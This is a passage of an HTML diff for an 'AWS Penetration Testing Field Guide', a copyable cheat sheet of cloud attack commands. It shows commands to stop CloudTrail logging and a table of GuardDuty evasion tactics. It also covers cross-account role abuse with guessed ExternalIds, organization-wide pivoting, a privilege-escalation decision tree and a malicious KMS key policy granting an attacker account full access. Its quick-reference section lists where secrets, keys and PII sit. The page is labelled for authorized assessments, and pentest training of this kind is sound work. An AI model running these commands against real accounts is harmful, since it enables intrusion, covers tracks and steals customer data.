+<span class="t-cmd">aws cloudtrail stop-logging</span> <span class="t-flag">--name</span> <span class="t-val">arn:aws:cloudtrail:...</span>
+
+<span class="t-cmt"># Delete CloudTrail log files from S3 (if you have s3:DeleteObject)</span>
+<span class="t-cmt"># Defenders should enable MFA Delete and versioning on trail buckets</span></pre></div>
+    </div>
+
+    <h3>GuardDuty Evasion Considerations</h3>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>GuardDuty Finding</th><th>Triggering Action</th><th>Evasion Approach</th></tr></thead>
+        <tbody>
+          <tr><td><code>UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration</code></td><td>Using IMDS creds from outside EC2</td><td>Use creds only from within VPC</td></tr>
+          <tr><td><code>Recon:IAMUser/UserPermissions</code></td><td>Rapid IAM enumeration</td><td>Slow down calls, use pagination</td></tr>
+          <tr><td><code>PenTest:IAMUser/KaliLinux</code></td><td>Calls from known pentest tool user agents</td><td>Use custom user agent strings</td></tr>
+          <tr><td><code>Impact:S3/AnomalousBehavior</code></td><td>Bulk S3 downloads</td><td>Slow, selective downloads mimicking normal behavior</td></tr>
+          <tr><td><code>PrivilegeEscalation:IAMUser/AdministrativePermissions</code></td><td>Self-attaching admin policies</td><td>Use indirect escalation methods (Lambda, CF)</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ──────────────────────────────────────────────────── -->
+  <!-- CROSS-ACCOUNT -->
+  <!-- ──────────────────────────────────────────────────── -->
+  <div class="section" id="cross-account">
+    <div class="section-header">
+      <div class="phase-icon v">🌐</div>
+      <div class="section-meta">
+        <div class="phase-label" style="color:var(--violet-hi)">Advanced</div>
+        <h2>Cross-Account Attacks</h2>
+      </div>
+    </div>
+
+    <h3>Cross-Account Role Assumption</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># Find cross-account role trusts</span>
+<span class="t-cmd">aws iam list-roles</span> | <span class="t-cmd">jq</span> -r <span class="t-val">'.Roles[] |
+  .AssumeRolePolicyDocument.Statement[] |
+  select(.Principal.AWS? | type == "string" and startswith("arn:aws:iam::") and
+    (split(":")[4] != "123456789012")) |
+  "Cross-account trust: \(.Principal.AWS)"'</span>
+
+<span class="t-cmt"># Enumerate resource-based policies for cross-account grants</span>
+<span class="t-cmt"># S3 bucket policy</span>
+<span class="t-cmd">aws s3api get-bucket-policy</span> <span class="t-flag">--bucket</span> <span class="t-val">&lt;bucket&gt;</span> | \
+  <span class="t-cmd">jq</span> <span class="t-val">'.Policy | fromjson | .Statement[] |
+    select(.Principal.AWS? | tostring | test("^(?!.*123456789012).*:root$"))'</span>
+
+<span class="t-cmt"># Abuse cross-account assume role (ExternalId bypass)</span>
+<span class="t-cmt"># If you know or can guess the ExternalId:</span>
+<span class="t-cmd">aws sts assume-role</span> \
+  <span class="t-flag">--role-arn</span> <span class="t-val">arn:aws:iam::VICTIM_ACCOUNT:role/CrossAccountRole</span> \
+  <span class="t-flag">--role-session-name</span> <span class="t-val">cross-account</span> \
+  <span class="t-flag">--external-id</span> <span class="t-val">KnownOrGuessedExternalId</span>
+
+<span class="t-cmt"># AWS Organizations — list all accounts if you're a payer/management account</span>
+<span class="t-cmd">aws organizations list-accounts</span>
+<span class="t-cmt"># Then try to assume OrganizationAccountAccessRole in each member account</span>
+<span class="t-cmd">aws sts assume-role</span> \
+  <span class="t-flag">--role-arn</span> <span class="t-val">arn:aws:iam::MEMBER_ACCOUNT:role/OrganizationAccountAccessRole</span> \
+  <span class="t-flag">--role-session-name</span> <span class="t-val">org-pivot</span></pre></div>
+    </div>
+  </div>
+
+  <!-- ──────────────────────────────────────────────────── -->
+  <!-- QUICK REFERENCE -->
+  <!-- ──────────────────────────────────────────────────── -->
+  <div class="section" id="quickref">
+    <div class="section-header">
+      <div class="phase-icon c">⚡</div>
+      <div class="section-meta">
+        <div class="phase-label" style="color:var(--cyan)">Quick Reference</div>
+        <h2>One-Liner Cheat Sheet</h2>
+      </div>
+    </div>
+
+    <h3>First 5 Commands After Getting Credentials</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmd">aws sts get-caller-identity</span>                                  <span class="t-cmt"># Who am I?</span>
+<span class="t-cmd">aws iam list-attached-user-policies</span> <span class="t-flag">--user-name</span> <span class="t-val">&lt;me&gt;</span>           <span class="t-cmt"># What policies do I have?</span>
+<span class="t-cmd">aws s3 ls</span>                                                     <span class="t-cmt"># What buckets exist?</span>
+<span class="t-cmd">aws secretsmanager list-secrets</span>                              <span class="t-cmt"># What secrets exist?</span>
+<span class="t-cmd">aws iam list-roles</span> <span class="t-flag">--query</span> <span class="t-val">'Roles[].RoleName'</span> <span class="t-flag">--output</span> text    <span class="t-cmt"># What roles can I target?</span></pre></div>
+    </div>
+
+    <h3>High-Value Target Locations</h3>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>Target</th><th>AWS Service</th><th>Command</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Database passwords</strong></td><td>Secrets Manager / SSM</td><td><code>aws secretsmanager list-secrets</code></td></tr>
+          <tr><td><strong>API keys</strong></td><td>Secrets Manager / Lambda env</td><td><code>aws lambda get-function-configuration</code></td></tr>
+          <tr><td><strong>TLS certificates / Private keys</strong></td><td>ACM / S3</td><td><code>aws acm export-certificate</code></td></tr>
+          <tr><td><strong>Application source code</strong></td><td>S3 / CodeCommit / Lambda</td><td><code>aws codecommit list-repositories</code></td></tr>
+          <tr><td><strong>User PII / Business data</strong></td><td>S3 / DynamoDB / RDS</td><td><code>aws dynamodb list-tables</code></td></tr>
+          <tr><td><strong>Infrastructure topology</strong></td><td>CloudFormation</td><td><code>aws cloudformation describe-stacks</code></td></tr>
+          <tr><td><strong>IAM credentials</strong></td><td>IAM / STS / EC2 IMDS</td><td>See Phase 6</td></tr>
+          <tr><td><strong>Encryption keys</strong></td><td>KMS</td><td><code>aws kms list-keys</code></td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>Common Privesc Decision Tree</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label note">LOGIC</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt">1. Can I attach/put policies on myself?
+   └─ YES → Attach AdministratorAccess to self (GAME OVER)
+
+2. Can I create a new policy version?
+   └─ YES → Create admin version, set as default
+
+3. Can I iam:PassRole?
+   ├─ + lambda:CreateFunction / UpdateFunctionCode → Lambda privesc
+   ├─ + ec2:RunInstances → EC2 instance profile privesc
+   ├─ + codebuild:StartBuild → CodeBuild exec as role
+   ├─ + scheduler:CreateSchedule → EventBridge scheduled action
+   └─ + cloudformation:CreateStack → CF stack with admin role
+
+4. Can I sts:AssumeRole any high-priv role?
+   └─ YES → Assume it directly
+
+5. Can I iam:UpdateAssumeRolePolicy on a high-priv role?
+   └─ YES → Add myself to trust policy, then assume
+
+6. Can I modify existing Lambda / CodeBuild / StepFunctions?
+   └─ YES → Code injection to exfil role credentials from compute env
+
+7. Resource-based policy opportunities?
+   ├─ s3:PutBucketPolicy → Cross-account data access
+   ├─ secretsmanager:PutResourcePolicy → Cross-account secret access
+   └─ lambda:AddPermission → Cross-account Lambda invocation</span></pre></div>
+    </div>
+
+    <h3>KMS Attacks</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># List KMS keys</span>
+<span class="t-cmd">aws kms list-keys</span>
+<span class="t-cmd">aws kms describe-key</span> <span class="t-flag">--key-id</span> <span class="t-val">&lt;key-id&gt;</span>
+
+<span class="t-cmt"># Get key policy (resource-based — check for cross-account grants)</span>
+<span class="t-cmd">aws kms get-key-policy</span> <span class="t-flag">--key-id</span> <span class="t-val">&lt;key-id&gt;</span> <span class="t-flag">--policy-name</span> <span class="t-val">default</span>
+
+<span class="t-cmt"># Put malicious key policy (if kms:PutKeyPolicy allowed)</span>
+<span class="t-cmd">aws kms put-key-policy</span> \
+  <span class="t-flag">--key-id</span> <span class="t-val">&lt;key-id&gt;</span> \
+  <span class="t-flag">--policy-name</span> <span class="t-val">default</span> \
+  <span class="t-flag">--policy</span> <span class="t-val">'{
+    "Version": "2012-10-17",
+    "Statement": [{
+      "Effect": "Allow",
+      "Principal": {"AWS": "arn:aws:iam::ATTACKER_ACCOUNT:root"},
+      "Action": "kms:*",
+      "Resource": "*"
+    }]
+  }'</span>
+
+<span class="t-cmt"># Decrypt data encrypted with a key you now control</span>
+<span class="t-cmd">aws kms decrypt</span> <span class="t-flag">--ciphertext-blob</span> <span class="t-val">fileb://encrypted.bin</span> \
+  <span class="t-flag">--key-id</span> <span class="t-val">&lt;key-id&gt;</span> \
+  <span class="t-flag">--query</span> <span class="t-val">Plaintext</span> <span class="t-flag">--output</span> text | <span class="t-cmd">base64</span> -d</pre></div>
+    </div>
+
+    <h3>DynamoDB Enumeration</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># List tables</span>
+<span class="t-cmd">aws dynamodb list-tables</span>
+
+<span class="t-cmt"># Describe table (schema, indexes, capacity)</span>
+<span class="t-cmd">aws dynamodb describe-table</span> <span class="t-flag">--table-name</span> <span class="t-val">Users</span>
+
+<span class="t-cmt"># Scan entire table (all items — use with caution on large tables)</span>
+<span class="t-cmd">aws dynamodb scan</span> <span class="t-flag">--table-name</span> <span class="t-val">Users</span>
+
+<span class="t-cmt"># Query for specific items</span>
+<span class="t-cmd">aws dynamodb query</span> \
+  <span class="t-flag">--table-name</span> <span class="t-val">Users</span> \
+  <span class="t-flag">--key-condition-expression</span> <span class="t-val">"userId = :id"</span> \
+  <span class="t-flag">--expression-attribute-values</span> <span class="t-val">'{ ":id": {"S": "admin"}}'</span>
+
+<span class="t-cmt"># Check DynamoDB resource policy (if it exists)</span>
+<span class="t-cmd">aws dynamodb get-resource-policy</span> <span class="t-flag">--resource-arn</span> <span class="t-val">arn:aws:dynamodb:...</span> 2>/dev/null</pre></div>
+    </div>
+
+    <h3>Useful jq Patterns for AWS Output</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># Extract policy actions from a policy document</span>
+<span class="t-cmd">aws iam get-policy-version</span> <span class="t-flag">--policy-arn</span> <span class="t-val">&lt;arn&gt;</span> <span class="t-flag">--version-id</span> v1 | \
+  <span class="t-cmd">jq</span> <span class="t-val">'.PolicyVersion.Document.Statement[] | {Effect, Action, Resource}'</span>
+
+<span class="t-cmt"># Find all Lambda functions with a specific role pattern</span>
+<span class="t-cmd">aws lambda list-functions</span> | \
+  <span class="t-cmd">jq</span> <span class="t-val">'.Functions[] | select(.Role | contains("admin")) | .FunctionName'</span>
+
+<span class="t-cmt"># Parse inline policy from role (URL-decode the document)</span>
+<span class="t-cmd">aws iam get-role-policy</span> <span class="t-flag">--role-name</span> <span class="t-val">RoleName</span> <span class="t-flag">--policy-name</span> <span class="t-val">PolicyName</span> | \
+  <span class="t-cmd">jq</span> <span class="t-val">'.PolicyDocument'</span>
+
+<span class="t-cmt"># Find S3 objects modified in last 24h (sign of active writes)</span>
+<span class="t-cmd">aws s3api list-objects-v2</span> <span class="t-flag">--bucket</span> <span class="t-val">my-bucket</span> | \
+  <span class="t-cmd">jq</span> <span class="t-val">'.Contents[] | select(.LastModified > "2024-01-01T00:00:00") | .Key'</span></pre></div>
+    </div>
+
+    <hr class="divider">
+
+    <h3>Engagement Notes Template</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label note">MARKDOWN</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># AWS Pentest Notes — [Client] — [Date]
+
+## Initial Access
+- Credential type: IAM User / Role / Federated
+- Identity ARN: arn:aws:iam::ACCOUNT:user/USERNAME
+- Account ID: 123456789012
+
+## Attack Path
+1. [Phase] [Action Taken] → [Result]
+2. ...
+
+## High-Value Findings
+| Finding | Resource | Severity | Evidence |
+|---------|----------|----------|----------|
+| Public S3 bucket | s3://bucket-name | HIGH | Screenshot |
+| IAM privesc via CreatePolicyVersion | arn:... | CRITICAL | CLI output |
+
+## Credentials Obtained
+- KEY: AKIA... (IAM User — non-expiring!)
+- KEY: ASIA... (Temporary STS — expires: ...)
+
+## Data Accessed
+- S3: s3://bucket/path
+- Secrets: prod/db/password
+
+## Cleanup Performed
+- [ ] Deleted backdoor IAM user
+- [ ] Restored original Lambda code
+- [ ] Removed test policy versions
+- [ ] Verified no persistence mechanisms remain</span></pre></div>
+    </div>
+
+  </div>
+
+  <!-- END OF CONTENT -->
+  <div style="text-align:center; padding: 40px 0 20px; color: var(--text-3); font-size: 12px; font-family: var(--font-mono);">
+    AWS Penetration Testing Field Guide &nbsp;·&nbsp; For Authorized Security Assessments Only
+  </div>
+
+</main>
+
+<button id="scroll-top" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</button>
+
+<script>
+// ─── COPY BUTTONS ─────────────────────────────────────────
+function copyBlock(btn) {
+  const pre = btn.closest('.cmd-block').querySelector('pre');
+  const text = pre.innerText;
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = '✓ Copied';
+    btn.classList.add('copied');
+    setTimeout(() => {
+      btn.textContent = '⎘ Copy';
+      btn.classList.remove('copied');
+    }, 2000);
+  });
+}
+
+// ─── COLLAPSIBLE ATTACK CARDS ─────────────────────────────
+function toggleCard(header) {
+  const card = header.closest('.attack-card');
+  card.classList.toggle('open');
+}
+
+// ─── ACTIVE SIDEBAR LINK ──────────────────────────────────
+const sbLinks = document.querySelectorAll('.sb-link');
+const sections = document.querySelectorAll('.section, .hero, .attack-flow');
+
+function updateActiveLink() {
+  let current = '';
+  sections.forEach(s => {
+    if (window.scrollY >= s.offsetTop - 100) current = s.id;
+  });
+  sbLinks.forEach(link => {
+    link.classList.remove('active');
+    if (link.getAttribute('href') === '#' + current) link.classList.add('active');
+  });
+}
+
+// ─── PROGRESS BAR ─────────────────────────────────────────
+function updateProgress() {
+  const doc = document.documentElement;
+  const scrolled = doc.scrollTop / (doc.scrollHeight - doc.clientHeight);
+  document.getElementById('progress-bar').style.width = (scrolled * 100) + '%';
+}
+
+// ─── SCROLL TOP BUTTON ────────────────────────────────────
+function updateScrollBtn() {
+  const btn = document.getElementById('scroll-top');
+  btn.classList.toggle('visible', window.scrollY > 400);
+}
+
+window.addEventListener('scroll', () => {
+  updateActiveLink();
+  updateProgress();
+  updateScrollBtn();
+}, {passive: true});
+
+// ─── SIDEBAR SEARCH ───────────────────────────────────────
+document.getElementById('sb-search-input').addEventListener('input', function() {
+  const q = this.value.toLowerCase();
+  sbLinks.forEach(link => {
+    const match = link.textContent.toLowerCase().includes(q);
+    link.style.display = q === '' || match ? '' : 'none';
+  });
+});
+
+// ─── INIT ─────────────────────────────────────────────────
+updateActiveLink();
+</script>
+</body>
+</html>
